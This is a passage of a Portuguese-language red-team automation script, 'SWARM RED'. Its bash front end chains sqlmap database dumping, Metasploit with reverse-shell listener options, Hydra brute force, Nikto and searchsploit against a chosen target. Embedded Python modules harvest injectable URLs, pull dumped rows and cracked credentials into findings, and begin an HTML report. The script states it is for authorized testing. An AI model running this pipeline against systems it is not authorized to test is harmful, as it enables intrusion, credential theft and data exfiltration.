  bash swarm_red.sh -t <target> --standalone           Sem SWARM prévio

${BLD}OPÇÕES:${RST}
  -d, --dir <path>      Diretório de output do SWARM (ex: scan_site.com_20260427_*)
  -t, --target <host>   Alvo (domínio ou IP). Auto-detectado do dir se omitido.
  -p, --profile <name>  Perfil: staging (default) | lab | production
  --dry-run             Mostrar comandos sem executar
  --standalone          Modo standalone (sem SWARM prévio)
  --lhost <ip>          IP local para reverse shells (auto-detectado)
  --lport <port>        Porta local para reverse shells (default: 4444)
  -h, --help            Esta mensagem

${BLD}PERFIS:${RST}
  ${GRN}staging${RST}     Agressividade alta. SQLi dump, Metasploit, brute force.
  ${YLW}lab${RST}         Sem restrições. Ambiente descartável.
  ${RED}production${RST}  Mínimo impacto. Só confirmação, sem dump, sem brute.

${BLD}EXEMPLOS:${RST}
  # Após rodar o SWARM:
  bash swarm_red.sh -d ~/Downloads/scan_target.com_20260427_120000

  # Lab com todas as opções:
  bash swarm_red.sh -d ./scan_lab -p lab --lhost 10.10.14.5

  # Dry-run para revisar antes de executar:
  bash swarm_red.sh -d ./scan_target -p staging --dry-run

  # Standalone (sem SWARM):
  bash swarm_red.sh -t 192.168.1.100 --standalone -p lab

${RED}⚠  USO EXCLUSIVO EM AMBIENTES AUTORIZADOS COM ROE DOCUMENTADO${RST}
EOF
    exit 0
}

# ═══════════════════════════════════════════════════════════════════════════════
#  PARSE ARGS
# ═══════════════════════════════════════════════════════════════════════════════
parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -d|--dir)       SCAN_DIR="$2"; shift 2 ;;
            -t|--target)    TARGET="$2"; shift 2 ;;
            -p|--profile)   PROFILE="$2"; shift 2 ;;
            --dry-run)      DRY_RUN=true; shift ;;
            --standalone)   STANDALONE=true; shift ;;
            --lhost)        LHOST="$2"; shift 2 ;;
            --lport)        LPORT="$2"; shift 2 ;;
            -h|--help)      show_help ;;
            *)
                fail "Opção desconhecida: $1"
                show_help
                ;;
        esac
    done

    # Validações
    if [ "$STANDALONE" = false ] && [ -z "$SCAN_DIR" ]; then
        fail "Especifique o diretório do SWARM (-d) ou use --standalone"
        show_help
    fi

    if [ "$STANDALONE" = true ] && [ -z "$TARGET" ]; then
        fail "Modo standalone requer -t <target>"
        show_help
    fi

    # Validar perfil
    if [[ ! "${PROFILE_DESCRIPTION[$PROFILE]+_}" ]]; then
        fail "Perfil inválido: $PROFILE (use: staging, lab, production)"
        exit 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════
main() {
    parse_args "$@"
    setup_path

    # Placeholder log until OUTDIR is created
    LOGFILE="/dev/null"

    banner
    validate_tools
    parse_swarm_results

    # Criar diretório de output (TARGET agora está definido)
    local timestamp
    timestamp=$(date '+%Y%m%d_%H%M%S')
    OUTDIR="swarm_red_${TARGET:-standalone}_${timestamp}"

    # Se parse_swarm_results já criou um OUTDIR temporário, mover conteúdo
    if [ -n "${_TEMP_OUTDIR:-}" ] && [ -d "$_TEMP_OUTDIR" ]; then
        mv "$_TEMP_OUTDIR" "$OUTDIR"
    else
        mkdir -p "$OUTDIR"/{sqlmap,metasploit,hydra,nikto,searchsploit}
    fi

    LOGFILE="$OUTDIR/swarm_red.log"
    touch "$LOGFILE"

    # Inicializar arquivos de tracking
    [ -f "$OUTDIR/exploits_confirmed.csv" ] || echo "status|target|tool|detail" > "$OUTDIR/exploits_confirmed.csv"
    [ -f "$OUTDIR/exploits_attempted.csv" ] || echo "status|target|tool|detail" > "$OUTDIR/exploits_attempted.csv"

    echo "[$(ts)] SWARM RED v${VERSION} started" >> "$LOGFILE"
    echo "[$(ts)] Profile: $PROFILE | Target: ${TARGET:-$SCAN_DIR} | Dry-run: $DRY_RUN" >> "$LOGFILE"

    confirm_roe

    run_sqli_phase
    run_msf_phase
    run_brute_phase
    run_nikto_phase
    run_searchsploit_phase

    print_summary
}

main "$@"

# Módulos Python embutidos
: << '__SWARM_RED_PAYLOAD_END_7x9k2m__'
___EMBEDDED_parsers_START___
#!/usr/bin/env python3
"""
SWARM RED — Parsers para resultados do SWARM scan.

Módulo independente que pode ser testado isoladamente.
Uso: python3 parsers.py <command> <args...>

Commands:
    parse_nuclei  <nuclei_jsonl> <outdir>     Parse nuclei e extrai CVEs + URLs
    parse_zap     <zap_json> <outdir>          Parse ZAP alerts
    extract_urls  <outdir> <target>            Consolida URLs de todas as fontes
"""
import sys
import os
import json
import re
import urllib.request
from typing import Dict, List, Set, Tuple, Optional


def parse_nuclei(nuclei_file: str, outdir: str) -> Dict[str, int]:
    """Parse nuclei JSONL e extrai CVEs, URLs com parâmetros, e todas URLs."""
    cves: Set[str] = set()
    urls_params: Set[str] = set()
    all_urls: Set[str] = set()

    with open(nuclei_file) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                continue

            # CVEs
            classification = obj.get("info", {}).get("classification", {})
            cve_list = classification.get("cve") or classification.get("cve-id") or []
            if isinstance(cve_list, list):
                for c in cve_list:
                    if c:
                        cves.add(c)
            elif isinstance(cve_list, str) and cve_list:
                cves.add(cve_list)

            # URLs
            url = obj.get("matched-at") or obj.get("host") or ""
            if url:
                all_urls.add(url)
                if "?" in url and "=" in url:
                    urls_params.add(url)

            # curl-command pode ter URLs com params
            curl = obj.get("curl-command", "")
            for u in re.findall(r"https?://[^\s'\"]+", curl):
                all_urls.add(u)
                if "?" in u and "=" in u:
                    urls_params.add(u)

    _write_set(f"{outdir}/cves_found.txt", cves)
    _write_set(f"{outdir}/urls_with_params.txt", urls_params)
    _write_set(f"{outdir}/all_target_urls.txt", all_urls)

    return {"cves": len(cves), "urls_params": len(urls_params), "urls_total": len(all_urls)}


def parse_zap(zap_file: str, outdir: str) -> Dict[str, int]:
    """Parse ZAP JSON (múltiplos formatos) e extrai SQLi URLs e alertas High/Critical."""
    try:
        with open(zap_file) as f:
            raw = json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        raw = []

    alerts = _normalize_zap_alerts(raw)

    sqli_urls: Set[str] = set()
    high_crit: List[str] = []

    for a in alerts:
        if not isinstance(a, dict):
            continue
        alert_name = a.get("alert", a.get("name", ""))
        url = a.get("url", a.get("uri", ""))
        risk = a.get("risk", a.get("riskdesc", ""))
        param = a.get("param", "")

        if isinstance(risk, str):
            risk = risk.split("(")[0].strip().split(" ")[0]

        if re.search(r"sql|injection", str(alert_name), re.IGNORECASE):
            if url:
                sqli_urls.add(url)

        if risk in ("High", "Critical"):
            high_crit.append(f"{risk}|{alert_name}|{url}")

    _write_set(f"{outdir}/zap_sqli_urls.txt", sqli_urls)
    with open(f"{outdir}/zap_high_crit.txt", "w") as f:
        f.write("\n".join(high_crit) + ("\n" if high_crit else ""))

    return {"sqli": len(sqli_urls), "high_crit": len(high_crit)}


def extract_all_urls(outdir: str, target: str) -> Dict[str, int]:
    """Consolida URLs injetáveis de todas as fontes."""
    urls_with_params: Set[str] = set()
    all_urls: Set[str] = set()

    # Extrair domínio base do target para filtrar URLs externas
    target_domain = target.lower().lstrip("www.")
    from urllib.parse import urlparse as _urlparse

    def add_url(url: str):
        if not url or not isinstance(url, str):
            return
        url = url.strip()
        if not url.startswith("http"):
            return
        # FILTRAR: só aceitar URLs do domínio alvo ou subdomínios
        try:
            host = _urlparse(url).hostname
            if host:
                host = host.lower().lstrip("www.")
                if host != target_domain and not host.endswith(f".{target_domain}"):
                    return  # URL externa — ignorar
        except:
            return
        all_urls.add(url)
        if "?" in url and "=" in url:
            urls_with_params.add(url)

    # Fonte 1: Nuclei
    for path in [f"{outdir}/input_nuclei.jsonl"]:
        if not os.path.exists(path):
            continue
        with open(path) as f:
            for line in f:
                try:
                    obj = json.loads(line.strip())
                    add_url(obj.get("matched-at", ""))
                    add_url(obj.get("host", ""))
                    for u in re.findall(r"https?://[^\s'\"]+", obj.get("curl-command", "")):
                        add_url(u)
                except:
                    pass

    # Fonte 2: ZAP (todas as URLs)
    for path in [f"{outdir}/input_zap.json"]:
        if not os.path.exists(path):
            continue
        try:
            with open(path) as f:
                raw = json.load(f)
        except:
            continue
        alerts = _normalize_zap_alerts(raw)
        for a in alerts:
            if not isinstance(a, dict):
                continue
            url = a.get("url", a.get("uri", ""))
            add_url(url)
            param = a.get("param", "")
            # ZAP "param" pode ser header HTTP — filtrar para apenas parâmetros reais
            if param and url and "?" not in url:
                # Headers HTTP comuns que o ZAP reporta como "param" mas NÃO são query params
                http_headers = {
                    "x-content-type-options", "x-frame-options", "x-xss-protection",
                    "content-security-policy", "strict-transport-security",
                    "cache-control", "pragma", "expires", "set-cookie", "cookie",
                    "content-type", "server", "x-powered-by", "access-control-allow-origin",
                    "referrer-policy", "permissions-policy", "feature-policy",
                    "x-content-security-policy", "x-webkit-csp", "x-download-options",
                    "x-permitted-cross-domain-policies", "cross-origin-opener-policy",
                    "cross-origin-resource-policy", "cross-origin-embedder-policy",
                    "accept", "accept-encoding", "accept-language", "user-agent",
                    "host", "connection", "upgrade-insecure-requests",
                }
                if param.lower().strip() not in http_headers and not param.startswith("x-"):
                    urls_with_params.add(f"{url}?{param}=test")

    # Fonte 3: httpx
    for path in [f"{outdir}/input_httpx.jsonl", f"{outdir}/input_httpx.txt"]:
        if not os.path.exists(path):
            continue
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if line.startswith("{"):
                    try:
                        obj = json.loads(line)
                        add_url(obj.get("url", ""))
                    except:
                        pass
                else:
                    parts = line.split()
                    if parts:
                        add_url(parts[0])

    # Fonte 4: ffuf
    ffuf_path = f"{outdir}/input_ffuf.json"
    if os.path.exists(ffuf_path):
        try:
            with open(ffuf_path) as f:
                data = json.load(f)
            results = data.get("results", data) if isinstance(data, dict) else data
            if isinstance(results, list):
                for r in results:
                    if isinstance(r, dict):
                        add_url(r.get("url", ""))
        except:
            pass

    # Fonte 4b: Katana URLs (crawler do SWARM — URLs reais com parâmetros)
    katana_path = f"{outdir}/input_katana_urls.txt"
    if os.path.exists(katana_path):
        try:
            with open(katana_path) as f:
                for line in f:
                    url = line.strip()
                    if url and url.startswith("http"):
                        add_url(url)
        except:
            pass

    # Fonte 4c: JS Analysis (endpoints descobertos em arquivos JavaScript)
    js_path = f"{outdir}/input_js_analysis.json"
    if os.path.exists(js_path):
        try:
            with open(js_path) as f:
                js_data = json.load(f)
            for ep in js_data.get("endpoints", []):
                if isinstance(ep, dict):
                    url = ep.get("url", ep.get("endpoint", ""))
                    add_url(url)
                elif isinstance(ep, str):
                    if ep.startswith("http"):
                        add_url(ep)
                    elif ep.startswith("/"):
                        add_url(f"https://{target}{ep}")
            # Endpoint probes (já verificados pelo SWARM)
            for probe in js_data.get("endpoint_probes", []):
                if isinstance(probe, dict):
                    add_url(probe.get("url", ""))
        except:
            pass

    # Fonte 4d: OpenAPI spec (rotas de API — alvos primários para SQLi)
    openapi_path = f"{outdir}/input_openapi_spec.json"
    if os.path.exists(openapi_path):
        try:
            with open(openapi_path) as f:
                spec = json.load(f)
            base_url = f"https://{target}"
            # Extrair servers se disponível
            servers = spec.get("servers", [])
            if servers and isinstance(servers[0], dict):
                base_url = servers[0].get("url", base_url).rstrip("/")
            # Extrair paths
            for path_str, methods in spec.get("paths", {}).items():
                full_url = f"{base_url}{path_str}"
                add_url(full_url)
                # Se tem parâmetros no path, gerar variantes
                if isinstance(methods, dict):
                    for method, details in methods.items():
                        if isinstance(details, dict):
                            for param in details.get("parameters", []):
                                if isinstance(param, dict) and param.get("in") == "query":
                                    pname = param.get("name", "")
                                    if pname:
                                        urls_with_params.add(f"{full_url}?{pname}=1")
        except:
            pass

    # Fonte 4e: Exploit confirmations do SWARM (URLs já confirmadas vulneráveis)
    confirm_path = f"{outdir}/input_exploit_confirmations.json"
    if os.path.exists(confirm_path):
        try:
            with open(confirm_path) as f:
                confirmations = json.load(f)
            for c in confirmations:
                if isinstance(c, dict) and c.get("confirmed", False):
                    url = c.get("url", "")
                    if url:
                        add_url(url)
                        # Estas URLs são CONFIRMADAS — adicionar com prioridade
                        if "?" in url:
                            urls_with_params.add(url)
        except:
            pass

    # Fonte 5: robots.txt e sitemap.xml
    for rpath in ["/robots.txt", "/sitemap.xml"]:
        try:
            req_url = f"https://{target}{rpath}"
            req = urllib.request.Request(req_url, headers={"User-Agent": "SWARM-RED/1.0"})
            resp = urllib.request.urlopen(req, timeout=10)
            if resp.status == 200:
                content = resp.read().decode("utf-8", errors="ignore")
                if "robots" in rpath:
                    for line in content.split("\n"):
                        m = re.match(r"(?:Dis)?[Aa]llow:\s*(\S+)", line)
                        if m:
                            p = m.group(1).strip()
                            if p and p != "/" and not p.startswith("#"):
                                add_url(f"https://{target}{p}")
                if "sitemap" in rpath:
                    for loc in re.findall(r"<loc>\s*(https?://[^<]+)\s*</loc>", content):
                        add_url(loc.strip())
        except:
            pass

    # Fonte 6: Variantes com parâmetros comuns (APENAS em URLs dinâmicas)
    # Parâmetros reais de aplicação — não headers HTTP, não arquivos estáticos
    common_params = ["id", "page", "q", "search", "user", "name",
                     "action", "type", "file", "cat", "dir", "cmd",
                     "category", "product", "item", "view", "ref",
                     "lang", "sort", "order", "limit", "offset"]

    # Extensões de arquivo que NUNCA processam parâmetros SQL
    STATIC_EXTENSIONS = {
        ".txt", ".xml", ".json", ".css", ".js", ".map",
        ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".webp",
        ".woff", ".woff2", ".ttf", ".eot", ".otf",
        ".pdf", ".doc", ".docx", ".xls", ".xlsx",
        ".zip", ".gz", ".tar", ".rar",
        ".mp3", ".mp4", ".avi", ".mov", ".webm",
        ".robots", ".sitemap",
    }

    # Paths que NUNCA são injetáveis
    STATIC_PATHS = {
        "/robots.txt", "/sitemap.xml", "/favicon.ico",
        "/crossdomain.xml", "/.well-known/", "/ads.txt",
        "/humans.txt", "/security.txt", "/manifest.json",
        "/sw.js", "/service-worker.js",
    }

    def _is_injectable_url(url):
        """Verifica se uma URL base pode conter endpoints dinâmicos."""
        from urllib.parse import urlparse
        parsed = urlparse(url)
        path = parsed.path.lower().rstrip("/")

        # Rejeitar arquivos estáticos por extensão
        for ext in STATIC_EXTENSIONS:
            if path.endswith(ext):
                return False

        # Rejeitar paths conhecidamente estáticos
        for sp in STATIC_PATHS:
            if path == sp or path.startswith(sp):
                return False

        # Rejeitar paths de assets/static
        static_dirs = ["/static/", "/assets/", "/css/", "/js/", "/img/",
                       "/images/", "/fonts/", "/media/", "/vendor/",
                       "/node_modules/", "/dist/", "/build/", "/public/"]
        for sd in static_dirs:
            if sd in path:
                return False

        return True

    # Filtrar URLs existentes — remover estáticas do urls_with_params
    urls_with_params = {u for u in urls_with_params if _is_injectable_url(u)}

    # Gerar variantes APENAS para URLs base dinâmicas
    base_urls = {u.rstrip("/") for u in all_urls if "?" not in u and _is_injectable_url(u)}
    if len(urls_with_params) < 5:
        for base in list(base_urls)[:15]:
            for param in common_params[:8]:
                urls_with_params.add(f"{base}?{param}=1")

    _write_set(f"{outdir}/urls_with_params.txt", urls_with_params)
    _write_set(f"{outdir}/all_target_urls.txt", all_urls)

    return {"params": len(urls_with_params), "total": len(all_urls), "bases": len(base_urls)}


# ═══════════════ HELPERS ═══════════════

def _normalize_zap_alerts(raw) -> list:
    """Normaliza ZAP JSON para lista de alert dicts."""
    alerts = []
    if isinstance(raw, list):
        alerts = raw
    elif isinstance(raw, dict):
        for key in ["alerts", "site"]:
            val = raw.get(key)
            if isinstance(val, list):
                for item in val:
                    if isinstance(item, dict):
                        if "alerts" in item:
                            al = item["alerts"]
                            alerts.extend(al if isinstance(al, list) else [al])
                        else:
                            alerts.append(item)
                break
            elif isinstance(val, dict):
                alerts.append(val)
        if not alerts:
            for v in raw.values():
                if isinstance(v, list) and len(v) > 0 and isinstance(v[0], dict):
                    alerts = v
                    break
    return alerts


def _write_set(path: str, data: set):
    """Escreve um set ordenado em um arquivo, um item por linha."""
    with open(path, "w") as f:
        f.write("\n".join(sorted(data)) + ("\n" if data else ""))


# ═══════════════ CLI ═══════════════

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    cmd = sys.argv[1]
    if cmd == "parse_nuclei" and len(sys.argv) >= 4:
        result = parse_nuclei(sys.argv[2], sys.argv[3])
        print(f"NUCLEI_OK|cves={result['cves']}|urls_params={result['urls_params']}|urls_total={result['urls_total']}")
    elif cmd == "parse_zap" and len(sys.argv) >= 4:
        result = parse_zap(sys.argv[2], sys.argv[3])
        print(f"ZAP_OK|sqli={result['sqli']}|high_crit={result['high_crit']}")
    elif cmd == "extract_urls" and len(sys.argv) >= 4:
        result = extract_all_urls(sys.argv[2], sys.argv[3])
        print(f"URLS_OK|params={result['params']}|total={result['total']}|bases={result['bases']}")
    else:
        print(f"Comando desconhecido: {cmd}")
        print(__doc__)
        sys.exit(1)
___EMBEDDED_parsers_END___
___EMBEDDED_evidence_START___
#!/usr/bin/env python3
"""
SWARM RED — Extração de evidências e consolidação de findings.

Uso: python3 evidence.py <outdir>
  Lê resultados do sqlmap/hydra/metasploit, extrai evidências
  profissionais e consolida findings para o relatório.
  Output: JSON em stdout com findings consolidados.
"""
import sys
import os
import json
import re
import glob
import csv
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse


def extract_sqlmap_evidence(log_content: str, log_dir: str) -> Dict[str, Any]:
    """Extrai evidência estruturada de um log do sqlmap."""
    info: Dict[str, Any] = {
        "target_url": "",
        "parameter": "",
        "place": "",
        "techniques": [],
        "dbms": "",
        "current_user": "",
        "current_db": "",
        "banner": "",
        "tables": [],
        "csv_data": [],
        "injectable": False,
    }

    for line in log_content.split("\n"):
        l = line.strip()
        ll = l.lower()
        clean = re.sub(r"\[\d{2}:\d{2}:\d{2}\]\s*\[\w+\]\s*", "", l)

        if "parameter '" in ll and ("is vulnerable" in ll or "injectable" in ll):
            info["injectable"] = True
            m = re.search(r"parameter '([^']+)'", l)
            if m:
                info["parameter"] = m.group(1)

        if "place:" in ll and not info["place"]:
            m = re.search(r"Place:\s*(\w+)", l, re.I)
            if m:
                info["place"] = m.group(1)

        if "type:" in ll and any(
            t in ll for t in ["boolean", "time", "union", "error", "stacked", "inline"]
        ):
            tech = re.sub(r"^.*Type:\s*", "", clean, flags=re.I).strip()
            if tech and tech not in info["techniques"] and "testing" not in ll:
                info["techniques"].append(tech)

        if "back-end dbms:" in ll:
            info["dbms"] = clean.split(":", 1)[-1].strip()
        if "current user:" in ll and ":" in l:
            info["current_user"] = clean.split(":", 1)[-1].strip().strip("'\"")
        if "current database:" in ll and ":" in l:
            info["current_db"] = clean.split(":", 1)[-1].strip().strip("'\"")
        if "banner:" in ll:
            info["banner"] = clean.split(":", 1)[-1].strip().strip("'\"")

        if re.match(r"^\[\*\]\s+\w", l) and "starting" not in ll and "shutting" not in ll:
            val = l.lstrip("[*] ").strip()
            if val and len(val) < 60 and val not in info["tables"]:
                info["tables"].append(val)

        m = re.search(r"testing URL '([^']+)'", l)
        if m:
            info["target_url"] = m.group(1)
        m = re.search(r"target URL:\s*(\S+)", l, re.I)
        if m:
            info["target_url"] = m.group(1)

    # Read CSV results
    csv_paths: List[str] = []
    for pattern in [f"{log_dir}/results-*.csv", f"{log_dir}/*/results-*.csv"]:
        csv_paths.extend(glob.glob(pattern))
    for d in glob.glob(f"{log_dir}/*/"):
        csv_paths.extend(glob.glob(f"{d}results-*.csv"))
    csv_paths = list(set(csv_paths))

    for cp in csv_paths[:3]:
        try:
            with open(cp) as f:
                reader = csv.reader(f)
                rows = list(reader)
                if len(rows) > 1:
                    info["csv_data"].append(
                        {"file": os.path.basename(cp), "header": rows[0], "rows": rows[1:10]}
                    )
        except Exception:
            pass

    # Read dump CSVs
    for dp in glob.glob(f"{log_dir}/dump/**/*.csv", recursive=True)[:3]:
        try:
            with open(dp) as f:
                reader = csv.reader(f)
                rows = list(reader)
                if rows:
                    tname = os.path.basename(dp).replace(".csv", "")
                    info["csv_data"].append(
                        {"file": f"dump/{tname}", "header": rows[0] if rows else [], "rows": rows[1:10]}
                    )
        except Exception:
            pass

    return info


def format_evidence(info: Dict[str, Any]) -> Optional[str]:
    """Formata evidência como texto profissional para relatório Red Team."""
    parts: List[str] = []

    if info["parameter"]:
        line = f"Parâmetro vulnerável: {info['parameter']}"
        if info["place"]:
            line += f" ({info['place']})"
        parts.append(line)

    if info["techniques"]:
        parts.append("Técnica(s) de injeção:")
        for t in info["techniques"][:5]:
            parts.append(f"  • {t}")

    if info["dbms"]:
        parts.append(f"DBMS identificado: {info['dbms']}")
    if info["banner"]:
        parts.append(f"Banner: {info['banner']}")
    if info["current_user"]:
        parts.append(f"Usuário atual: {info['current_user']}")
    if info["current_db"]:
        parts.append(f"Base de dados atual: {info['current_db']}")

    if info["tables"]:
        parts.append("Bases/Tabelas encontradas:")
        for t in info["tables"][:10]:
            parts.append(f"  • {t}")

    if info["csv_data"]:
        for csv_info in info["csv_data"][:2]:
            parts.append(f"\nDados extraídos ({csv_info['file']}):")
            if csv_info["header"]:
                parts.append("  " + " | ".join(str(h) for h in csv_info["header"]))
                parts.append("  " + "-" * min(70, len(" | ".join(str(h) for h in csv_info["header"]))))
            for row in csv_info["rows"][:5]:
                parts.append("  " + " | ".join(str(c) for c in row))
            if len(csv_info["rows"]) > 5:
                parts.append(f"  ... ({len(csv_info['rows'])} registros total)")

    return "\n".join(parts[:25]) if parts else None


def collect_and_consolidate(outdir: str) -> Dict[str, Any]:
    """Coleta dados de todas as fontes e consolida findings deduplicados."""

    def _rf(p: str, lim: Optional[int] = None) -> str:
        try:
            with open(p) as f:
                c = f.read()
                return c[-lim:] if lim else c
        except:
            return ""

    def _rl(p: str) -> List[str]:
        try:
            with open(p) as f:
                return [l.strip() for l in f if l.strip()]
        except:
            return []

    def _rj(p: str):
        try:
            with open(p) as f:
                return json.load(f)
        except:
            return []

    # ── SQLi results ──
    sqli_results = []
    for f in sorted(glob.glob(f"{outdir}/sqlmap/*_output.log")):
        with open(f) as fh:
            c = fh.read()
        vuln = any(w in c.lower() for w in ["is vulnerable", "injectable", "payload", "fetched"])
        info = extract_sqlmap_evidence(c, os.path.dirname(f))
        info["injectable"] = info["injectable"] or vuln
        evidence = format_evidence(info)
        target_url = info["target_url"]
        if not target_url:
            m = re.search(r"testing URL '([^']+)'", c) or re.search(r"-u ['\"]?([^\s'\"]+)", c)
            target_url = m.group(1) if m else os.path.basename(f)
        sqli_results.append({
            "file": os.path.basename(f), "vulnerable": info["injectable"],
            "evidence": evidence, "target_url": target_url, "info": info
        })

    # ── Other sources ──
    msf_log = _rf(f"{outdir}/metasploit/msf_output.log", 4000)

    hydra_results = []
    for f in glob.glob(f"{outdir}/hydra/*_results.txt"):
        c = _rf(f).strip()
        if c:
            hydra_results.append({"service": os.path.basename(f).replace("_results.txt", ""), "content": c})

    nikto_findings = []
    nd = _rj(f"{outdir}/nikto/nikto_report.json")
    if isinstance(nd, dict):
        nikto_findings = nd.get("vulnerabilities", [])
    elif isinstance(nd, list):
        nikto_findings = [x for x in nd if isinstance(x, dict)]

    confirmed = []
    for line in _rl(f"{outdir}/exploits_confirmed.csv"):
        p = line.split("|")
        if len(p) >= 3 and p[0] != "status":
            confirmed.append({"status": p[0], "target": p[1], "tool": p[2], "detail": p[3] if len(p) > 3 else ""})

    cves = _rl(f"{outdir}/cves_found.txt")
    services = _rl(f"{outdir}/open_services.txt")
    log_content = _rf(f"{outdir}/swarm_red.log", 3000)

    zap_hc = []
    for line in _rl(f"{outdir}/zap_high_crit.txt"):
        p = line.split("|")
        if len(p) >= 3:
            zap_hc.append({"risk": p[0], "alert": p[1], "url": p[2]})

    ssd = {}
    for f in glob.glob(f"{outdir}/searchsploit/CVE-*.json"):
        cv = os.path.basename(f).replace(".json", "")
        d = _rj(f)
        if isinstance(d, dict):
            ex = d.get("RESULTS_EXPLOIT", [])
            if ex:
                ssd[cv] = ex

    # ── Consolidate findings ──
    findings: List[Dict] = []
    vc = [c for c in confirmed if c["status"] == "VULNERABLE"]

    # Group confirmed by URL base path
    confirmed_groups: Dict = {}
    for c in vc:
        base = re.sub(r"\?.*$", "", c["target"]).rstrip("/")
        path = re.sub(r"https?://[^/]+", "", base)
        key = (c["tool"], path)
        if key not in confirmed_groups:
            confirmed_groups[key] = {"urls": [], "tool": c["tool"], "detail": c.get("detail", "")}
        confirmed_groups[key]["urls"].append(c["target"])

    for key, grp in confirmed_groups.items():
        urls = grp["urls"]
        tool = grp["tool"]
        n = len(urls)

        best_ev = None
        for sr in sqli_results:
            if sr["vulnerable"] and sr["evidence"]:
                sr_base = re.sub(r"\?.*$", "", sr["target_url"]).rstrip("/")
                for u in urls:
                    u_base = re.sub(r"\?.*$", "", u).rstrip("/")
                    if sr_base == u_base:
                        best_ev = sr["evidence"]
                        break
                if best_ev:
                    break
        if not best_ev:
            for sr in sqli_results:
                if sr["vulnerable"] and sr["evidence"]:
                    best_ev = sr["evidence"]
                    break

        ev_parts = []
        if best_ev:
            ev_parts.append(best_ev)
        ev_parts.append(f"\nEndpoints afetados ({n}):")
        for u in urls[:20]:
            ev_parts.append(f"  • {u}")
        if n > 20:
            ev_parts.append(f"  ... e mais {n - 20} endpoint(s)")

        findings.append({
            "sev": "High",
            "title": f"SQL Injection — {tool} ({n} endpoints)" if n > 1 else f"SQL Injection — {tool}",
            "target": urls[0] if n == 1 else f"{n} endpoints em {urlparse(urls[0]).netloc}",
            "tool": tool, "detail": "\n".join(ev_parts), "type": "sqli",
            "count": n, "endpoints": urls
        })

    # Unmatched SQLi from logs
    confirmed_urls = set(u for grp in confirmed_groups.values() for u in grp["urls"])
    unmatched = [r for r in sqli_results if r["vulnerable"] and r["target_url"] not in confirmed_urls]
    if unmatched:
        groups: Dict = {}
        for r in unmatched:
            ev_key = (r["info"]["parameter"], r["info"]["dbms"])
            if ev_key not in groups:
                groups[ev_key] = {"items": [], "evidence": r["evidence"]}
            groups[ev_key]["items"].append(r)

        for ev_key, grp in groups.items():
            items = grp["items"]
            n = len(items)
            urls = [r["target_url"] for r in items]
            ev_parts = []
            if grp["evidence"]:
                ev_parts.append(grp["evidence"])
            if n > 1:
                ev_parts.append(f"\nEndpoints ({n}):")
                for u in urls[:15]:
                    ev_parts.append(f"  • {u}")
                if n > 15:
                    ev_parts.append(f"  ... e mais {n - 15}")
            findings.append({
                "sev": "High",
                "title": f"SQL Injection Confirmada ({n} endpoints)" if n > 1 else "SQL Injection Confirmada",
                "target": urls[0] if n == 1 else f"{n} endpoints",
                "tool": "sqlmap", "detail": "\n".join(ev_parts) or "Injeção SQL confirmada via sqlmap",
                "type": "sqli", "count": n, "endpoints": urls
            })

    # Hydra
    for r in hydra_results:
        findings.append({
            "sev": "High", "title": f"Credenciais Fracas — {r['service'].upper()}",
            "target": r["service"], "tool": "hydra", "detail": r["content"][:400],
            "type": "bruteforce", "count": 1, "endpoints": []
        })

    # Final dedup
    seen: set = set()
    deduped = []
    for f in findings:
        key = (f["tool"], f["type"], f.get("count", 0))
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    return {
        "findings": deduped,
        "sqli_results": sqli_results,
        "msf_log": msf_log,
        "hydra_results": hydra_results,
        "nikto_findings": nikto_findings,
        "confirmed": confirmed,
        "cves": cves,
        "services": services,
        "log_content": log_content,
        "zap_hc": zap_hc,
        "searchsploit": ssd,
    }


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    result = collect_and_consolidate(sys.argv[1])
    print(json.dumps({
        "findings_count": len(result["findings"]),
        "sqli_vulnerable": len([r for r in result["sqli_results"] if r["vulnerable"]]),
        "cves": len(result["cves"]),
        "services": len(result["services"]),
    }, indent=2))
___EMBEDDED_evidence_END___
___EMBEDDED_report_generator_START___
#!/usr/bin/env python3
"""
SWARM RED — Gerador de Relatório Red Team (Big4 Style).

Uso: python3 report_generator.py <outdir> <target> <profile> <total> <success> <failed> <version>

Lê dados consolidados de evidence.py e gera relatorio_swarm_red.html.
"""
import sys
import os
import html as H
from datetime import datetime

# Adicionar lib/ ao path para importar evidence.py
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from evidence import collect_and_consolidate

esc = lambda s: H.escape(str(s)) if s else ""


def generate_report(
    outdir: str, target: str, profile: str,
    total: int, success: int, failed: int, version: str
) -> str:
    """Gera relatório HTML e retorna o path do arquivo."""
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    # Coletar e consolidar todos os dados
    data = collect_and_consolidate(outdir)
    findings = data["findings"]
    sqli_results = data["sqli_results"]
    msf_log = data["msf_log"]
    hydra_results = data["hydra_results"]
    nikto_findings = data["nikto_findings"]
    cves = data["cves"]
    services = data["services"]
    log_content = data["log_content"]
    zap_hc = data["zap_hc"]
    ssd = data["searchsploit"]

    # Stats
    st = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
    for f in findings:
        if f["sev"] in st:
            st[f["sev"]] += 1
    tf = sum(st.values())
    rs = min(100, st["Critical"] * 30 + st["High"] * 15 + st["Medium"] * 5 + st["Low"])

    if rs >= 70:   rl_, rc_ = "CRÍTICO", "#7a2e2e"
    elif rs >= 40: rl_, rc_ = "ALTO", "#b34e4e"
    elif rs >= 15: rl_, rc_ = "MÉDIO", "#d4833a"
    else:          rl_, rc_ = "BAIXO", "#4a7c8c"

    pl = {"staging": "Staging/Homolog", "lab": "Laboratório", "production": "Produção (Janela Aprovada)"}
    sqli_vc = len([r for r in sqli_results if r["vulnerable"]])
    msf_sess = msf_log.lower().count("session") if msf_log else 0
    total_endpoints = sum(f.get("count", 1) for f in findings)

    # ═══════════════ BUILD HTML ═══════════════
    html = _build_html(
